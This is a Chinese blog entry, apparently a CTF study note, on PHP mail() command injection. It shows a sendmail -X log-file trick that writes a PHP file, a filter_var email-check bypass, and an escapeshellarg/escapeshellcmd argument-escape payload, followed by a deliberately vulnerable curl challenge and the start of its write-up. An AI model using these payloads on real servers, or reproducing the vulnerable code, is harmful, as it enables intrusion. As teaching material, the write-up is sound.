<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红日代审Day5-mail函数命令执行漏洞</title>
      <link href="/archives/1efa6206/"/>
      <url>/archives/1efa6206/</url>
      
        <content type="html"><![CDATA[<h2 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h2><p><img src="/archives/1efa6206/image-20251021192339318.png" alt="image-20251021192339318"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mail</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$to</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$message</span>,</span><br><span class="line">    <span class="keyword">array</span>|<span class="keyword">string</span> <span class="variable">$additional_headers</span> = [],</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$additional_params</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><ul><li><p><strong><code>to</code></strong></p><p>电子邮件收件人，或收件人列表。本字符串的格式必须符合 <a href="https://datatracker.ietf.org/doc/html/rfc2822">» RFC 2822</a>。例如：</p><ul><li><a href="mailto:&#117;&#x73;&#x65;&#x72;&#64;&#x65;&#x78;&#x61;&#109;&#112;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#x6d;">&#117;&#x73;&#x65;&#x72;&#64;&#x65;&#x78;&#x61;&#109;&#112;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#x6d;</a></li><li><a href="mailto:&#117;&#x73;&#x65;&#114;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#108;&#101;&#x2e;&#99;&#x6f;&#109;">&#117;&#x73;&#x65;&#114;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#108;&#101;&#x2e;&#99;&#x6f;&#109;</a>, <a href="mailto:&#97;&#x6e;&#x6f;&#116;&#104;&#x65;&#x72;&#x75;&#x73;&#101;&#114;&#64;&#101;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#x6f;&#x6d;">&#97;&#x6e;&#x6f;&#116;&#104;&#x65;&#x72;&#x75;&#x73;&#101;&#114;&#64;&#101;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#x6f;&#x6d;</a></li><li>User</li><li>User , Another User</li></ul></li><li><p><strong><code>subject</code></strong></p><p>电子邮件的主题。</p><p><strong>警告：</strong>本项不能包含任何换行符，否则邮件可能无法正确发送。</p></li><li><p><strong><code>message</code></strong></p><p>所要发送的消息。行之间必须以一个 CRLF（\r\n）分隔。每行不能超过 70 个字符。</p><p><strong>警告：</strong>（Windows 下）当 PHP 直接连接到 SMTP 服务器时，如果在一行开头发现一个句号，则会被删掉。要避免此问题，将单个句号替换成两个句号。</p></li><li><p><code>additional_headers</code>（可选项）</p><p>要插入到邮件 header 尾部的 <a href="https://www.php.net/manual/zh/language.types.string.php">String</a> 或 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a>。</p><p>这通常用于添加额外的 header（From、Cc 和 Bcc）。多个额外的 header 应使用 CRLF（\r\n）分隔。如果使用外部数据来组成此 header，则应对数据进行清理，避免注入不需要的 header。</p><p>如果传递 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a>，则 key 是 header 名称，value 对应的 header 值。</p><p><strong>注意</strong>:</p><p>发送邮件时，邮件<em>必须</em>包含 <code>From</code> header。这可以使用 <code>additional_headers</code> 参数来设置，或者可以在 php.ini 中设置默认值。</p><p>如果不这样做，将导致类似于 <code>Warning: mail(): &quot;sendmail_from&quot; not set in php.ini or custom &quot;From:&quot; header missing</code> 的错误消息。当直接通过 SMTP（仅限 Windows）发送时，<code>From</code> header 还会设置 <code>Return-Path</code>。</p><p><strong>注意</strong>:</p><p>如果未收到消息，请尝试仅使用 LF（\n）。一些 Unix 邮件传输代理（最著名的是 <a href="http://cr.yp.to/qmail.html">» qmail</a>）会自动用 CRLF 替换 LF（如果使用 CRLF，则会导致 CR 重复）。这应该是最后的手段，因为它不符合 <a href="https://datatracker.ietf.org/doc/html/rfc2822">» RFC 2822</a>。</p></li><li><p><code>additional_params</code>（可选）</p><p>发送邮件时，<code>additional_params</code> 参数可用于将额外的 flag 作为命令行选项传递给通过 <code>sendmail_path</code> 配置项指定的邮件发送程序。例如，当使用 sendmail 并配合 <code>-f</code> 选项时，可通过此参数设置邮件发件人地址。</p><p>该参数在内部会<strong>经过 <a href="https://www.php.net/manual/zh/function.escapeshellcmd.php">escapeshellcmd()</a> 转义，以防止命令注入执行。</strong><a href="https://www.php.net/manual/zh/function.escapeshellcmd.php">escapeshellcmd()</a> 虽可阻止命令执行，但仍允许添加额外的参数。出于安全考虑，建议用户自行对该参数进行过滤和清理，避免向 shell 命令中注入非预期的参数。</p><p>由于会自动应用 <a href="https://www.php.net/manual/zh/function.escapeshellcmd.php">escapeshellcmd()</a>，某些符合互联网 RFC 标准、允许在电子邮件地址中使用的字符将无法通过此方式使用。<strong>mail()</strong> 无法支持这些字符，因此，若程序中必须使用此类字符，建议改用其他发送邮件的方式（例如使用框架或第三方库）。</p><p>应将运行 Web 服务器的用户添加到 sendmail 配置的受信任用户列表中，以避免通过此方法设置信封发件人（-f）时，邮件自动带上 “X-Warning” 头部。对于使用 sendmail 的用户，该文件路径为 &#x2F;etc&#x2F;mail&#x2F;trusted-users。</p></li><li><p><strong>返回值</strong></p><p>如果邮件成功接受投递，返回 **<code>true</code>**，否则返回 **<code>false</code>**。</p><p>同样重要的是要注意到，邮件仅接受了投递并不意味着邮件实际上达到预定目的地。</p></li></ul><p>demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 消息</span></span><br><span class="line"><span class="variable">$message</span> = <span class="string">&quot;Line 1\r\nLine 2\r\nLine 3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果任何一行超过 70 个字符，应该使用 wordwrap()</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">wordwrap</span>(<span class="variable">$message</span>, <span class="number">70</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&#x27;caffeinated@example.com&#x27;</span>, <span class="string">&#x27;My Subject&#x27;</span>, <span class="variable">$message</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>添加基本 header，告诉 MUA 发件人和回复地址：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$to</span>      = <span class="string">&#x27;nobody@example.com&#x27;</span>;</span><br><span class="line"><span class="variable">$subject</span> = <span class="string">&#x27;the subject&#x27;</span>;</span><br><span class="line"><span class="variable">$message</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="string">&#x27;From: webmaster@example.com&#x27;</span> . <span class="string">&quot;\r\n&quot;</span> .</span><br><span class="line">    <span class="string">&#x27;Reply-To: webmaster@example.com&#x27;</span> . <span class="string">&quot;\r\n&quot;</span> .</span><br><span class="line">    <span class="string">&#x27;X-Mailer: PHP/&#x27;</span> . <span class="title function_ invoke__">phpversion</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="variable">$to</span>, <span class="variable">$subject</span>, <span class="variable">$message</span>, <span class="variable">$headers</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var"></a>filter_var</h2><p><img src="/archives/1efa6206/image-20251019183134462.png" alt="image-20251019183134462"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT, <span class="keyword">array</span>|<span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>value</strong></p><p>要过滤的内容。注意标量值在过滤前，会先<a href="https://www.php.net/manual/zh/language.types.string.php#language.types.string.casting">转换成字符串</a>。</p></li><li><p><strong>filter</strong></p><p>要应用的过滤器。可以使用 <strong><code>FILTER_VALIDATE_\*</code></strong> 常量作为验证过滤器，使用 <strong><code>FILTER_SANITIZE_\*</code></strong> 或 <strong><code>FILTER_UNSAFE_RAW</code></strong> 作为清理过滤器，也可以使用 <strong><code>FILTER_CALLBACK</code></strong> 作为自定义过滤器。</p><blockquote><p><strong>注意</strong>: 默认值为 **<code>FILTER_DEFAULT</code>**，是 <strong><code>FILTER_UNSAFE_RAW</code></strong> 的别名。这将导致默认情况下不进行过滤。</p></blockquote></li><li><p><strong>options</strong></p><p>要么是选项的关联 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a>，要么是过滤器 flag 常量 <strong><code>FILTER_FLAG_\*</code></strong> 的位掩码。 如果 <code>filter</code> 接受选项（option），则可以使用数组的 <code>&quot;flags&quot;</code> 字段提供 flag。</p></li><li><p><strong>返回值</strong></p><p>成功时返回过滤后的数据。失败时返回 **<code>false</code>**，除非使用 <strong><code>FILTER_NULL_ON_FAILURE</code></strong> flag，在这种情况下会返回 **<code>null</code>**。</p></li></ul><p>demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">filter_var</span>(<span class="string">&#x27;bob@example.com&#x27;</span>, FILTER_VALIDATE_EMAIL));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">filter_var</span>(<span class="string">&#x27;https://example.com&#x27;</span>, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(15) &quot;bob@example.com&quot;</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure><blockquote><p>第一个验证字符串<code>bob@example.com</code>是否是有效的邮箱格式</p><p>第二个验证字符串<code>https://example.com</code>是否是有效的URL，并且要求必须包含路径</p></blockquote><h2 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h2><p><img src="/archives/1efa6206/image-20251021193525319.png" alt="image-20251021193525319"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellarg</span>(<span class="keyword">string</span> <span class="variable">$arg</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><ul><li><p><strong><code>arg</code></strong></p><p>需要被转义的参数。</p></li><li><p><strong>返回值</strong></p><p>转换之后字符串。</p></li></ul><p>demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$dir</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Demo分析"><a href="#Demo分析" class="headerlink" title="Demo分析"></a>Demo分析</h2><p><img src="/archives/1efa6206/image-20251021193958295.png" alt="image-20251021193958295"></p><p>这道题其实是考察由 <strong>php</strong> 内置函数 <strong>mail</strong> 所引发的命令执行漏洞。</p><p>在Linux系统上， <strong>php</strong> 的 <strong>mail</strong> 函数在底层中已经写好了，默认调用 <strong>Linux</strong> 的 <strong><a href="http://www.sendmail.com/">sendmail</a></strong> 程序发送邮件。而在额外参数( <strong>additional_parameters</strong> )中， <strong>sendmail</strong> 主要支持的选项有以下三种：</p><ul><li><p><strong>-O option &#x3D; value</strong></p><p><strong>QueueDirectory &#x3D; queuedir 选择队列消息</strong></p></li><li><p><strong>-X logfile</strong></p><p><strong>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</strong></p></li><li><p><strong>-f from email</strong></p><p><strong>这个参数可以让我们指定我们发送邮件的邮箱地址。</strong></p></li></ul><p>举个简单例子方便理解: </p><p><img src="/archives/1efa6206/image-20251021194242305.png" alt="image-20251021194242305"></p><p>上面这个样例中，我们使用 <strong>-X</strong> 参数指定日志文件，最终会在 <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;rce.php</strong> 中写入如下数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17220</span> &lt;&lt;&lt; To: Alice@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; Subject: Hello Alice!</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; X-PHP-Originating-Script: <span class="number">0</span>:test.php</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; CC: somebodyelse@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt;</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; [EOF]</span><br></pre></td></tr></table></figure><p>当然这题如果只是这一个问题的话，会显的太简单了，我们继续往下看，在 <strong>第3行</strong> 有这样一串代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)</span><br></pre></td></tr></table></figure><p>这串代码的主要作用，是确保在第5个参数中只使用有效的电子邮件地址 <strong>$email</strong> 。</p><p>关于 <strong>filter_var()</strong> 中 <strong>FILTER_VALIDATE_EMAIL</strong> 这个选项作用，我们可以看看这个帖子 <a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly">PHP FILTER_VALIDATE_EMAIL</a> 。这里面有个结论引起了我的注意： <strong>none of the special characters in this local part are allowed outside quotation marks</strong> ，表示所有的特殊符号必须放在双引号中。</p><p>根据 RFC 5322 标准，<code>local-part</code> 可以有两种形式：</p><ol><li><strong>普通格式：</strong> 使用有限的字符集（字母、数字、一些特殊符号如 <code>. ! # $ % &amp; &#39; * + / = ? ^ _  &#123; | &#125; ~ -</code>）。<strong>不能有空格</strong>，也不能有 <code>( ) &lt; &gt; [ ] : ; @ , &quot;</code> 这些字符。</li><li><strong>带引号格式：</strong> 整个 <code>local-part</code> 可以用双引号 <code>&quot; &quot;</code> 包起来。在引号内，<strong>几乎可以放任何字符</strong>，包括空格、点、甚至双引号本身（但双引号需要用反斜杠 <code>\</code> 转义）。</li></ol><p> <strong>filter_var()</strong> 问题在于，我们在<strong>双引号中嵌套转义空格仍然能够通过检测</strong>。</p><p>举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;my\&quot; email&quot;@example.com</span><br></pre></td></tr></table></figure><ul><li><code>filter_var()</code> 看到开头的双引号，进入“引号模式”。</li><li>它看到 <code>my</code>，然后看到 <code>\&quot;</code>，这被解释为一个<strong>转义的双引号字符</strong>，而不是结束引号。</li><li>接着它看到 <code>email&quot;</code>，并认为 <code>&quot;</code> 是结束引号。</li><li>所以最终的 <code>local-part</code> 被解析为 <code>my&quot; email</code>。</li></ul><p>同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 <strong>filter_val()</strong> 使其认为我们仍然在双引号中，这样我们就可以绕过检测。</p><p>下面举个简单的例子，方便理解：</p><p><img src="/archives/1efa6206/image-20251021194551166.png" alt="image-20251021194551166"></p><p>当然由于引入的特殊符号，虽然绕过了 <strong>filter_var()</strong> 针对邮箱的检测，但是由于PHP的 <strong>mail()</strong> 函数在底层实现中，调用了 <strong>escapeshellcmd()</strong> 函数，对用户输入的邮箱地址进行检测，导致即使存在特殊符号，也会被 <strong>escapeshellcmd()</strong> 函数处理转义，这样就没办法达到命令执行的目的了。 <strong>escapeshellcmd()</strong> 函数在底层代码如下（详细点 <a href="https://github.com/php/php-src/blob/PHP-5.6.29/ext/standard/mail.c">这里</a> ）：</p><p><img src="/archives/1efa6206/image-20251021194906215.png" alt="image-20251021194906215"></p><p>因此我们继续往下看，在第七行有这样一串代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$email</span>);</span><br></pre></td></tr></table></figure><p>这句代码主要是处理 <strong>$email</strong> 传入的数据。 </p><p>具体功能作用，可以参考如下案例：</p><p><img src="/archives/1efa6206/image-20251021195002343.png" alt="image-20251021195002343"></p><p>那我们前面说过了PHP的 <strong>mail()</strong> 函数在底层调用了 <strong>escapeshellcmd()</strong> 函数对用户输入的邮箱地址进行处理，即使我们使用带有特殊字符的payload，绕过 <strong>filter_var()</strong> 的检测，但还是会被 <strong>escapeshellcmd()</strong> 处理。然而 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg</strong> 一起使用，会造成特殊字符逃逸，下面我们给个简单例子理解一下：</p><p><img src="/archives/1efa6206/image-20251021195156373.png" alt="image-20251021195156373"></p><ol><li><p>分析一下过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; -v -d a=1</span><br></pre></td></tr></table></figure></li><li><p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br></pre></td></tr></table></figure></li><li><p>接着 <code>escapeshellcmd</code> 函数对第二步处理后字符串中的 <code>\</code> 以及 <code>a=1&#39;</code> 中的单引号进行转义处理，结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;</span><br></pre></td></tr></table></figure></li><li><p>由于第三步处理之后的payload中的 <code>\\</code> 被解释成了 <code>\</code> 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：</p><p><img src="/archives/1efa6206/image-20251021201655347.png" alt="image-20251021201655347"></p></li></ol><p>所以这个payload可以简化为 <code>curl 127.0.0.1\ -v -d a=1&#39;</code> ，即向 <code>127.0.0.1\</code> 发起请求，POST 数据为 <code>a=1&#39;</code> 。</p><p>总结一下，这题实际上是考察绕过 <strong>filter_var()</strong> 函数的邮件名检测，通过 <strong>mail</strong> 函数底层实现中调用的 <strong>escapeshellcmd()</strong> 函数处理字符串，再结合 <strong>escapeshellarg()</strong> 函数，最终实现参数逃逸，导致 <strong>远程代码执行</strong> 。</p><p>所以正常情况不建议同时使用 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 函数对参数进行过滤</p><h2 id="CTF例题练习"><a href="#CTF例题练习" class="headerlink" title="CTF例题练习"></a>CTF例题练习</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;are you a hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>); &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>) &#123; <span class="title function_ invoke__">waf</span>(<span class="variable">$_COOKIE</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;HRCTF&#123;Are_y0u_maz1ng&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/1efa6206/image-20251021202601414.png" alt="image-20251021202601414"></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>审计代码发现有一段waf，让我们传参时不能带有flag字样，同时注意下面的遍历：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$$</code>典型的变量覆盖，他会遍历我们GET、POST和Cookie的参数，并且如果变量名和值如果与已存在的变量名和值相等则销毁该变量。</p><p>然后后面需要存在**<code>$_GET[&#39;flag&#39;]</code><strong>进行md5弱比较，最后利用</strong>escapeshellarg()** 和 <strong>escapeshellcmd()</strong> 函数漏洞使curl读取文件</p><p>首先绕过waf，由于是在waf前进行的遍历，且<code>_POST</code>先遍历那么我们可以在遍历时销毁<code>$_GET</code>中的flag变量来绕过，即：</p><p>POST:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_GET[flag]=QNKCDZO</span><br></pre></td></tr></table></figure><p>GET：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=QNKCDZO</span><br></pre></td></tr></table></figure><p><img src="/archives/1efa6206/image-20251021205313472.png" alt="image-20251021205313472"></p><p>成功绕过，注意后面waf后还有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br></pre></td></tr></table></figure><p><strong>extract</strong> 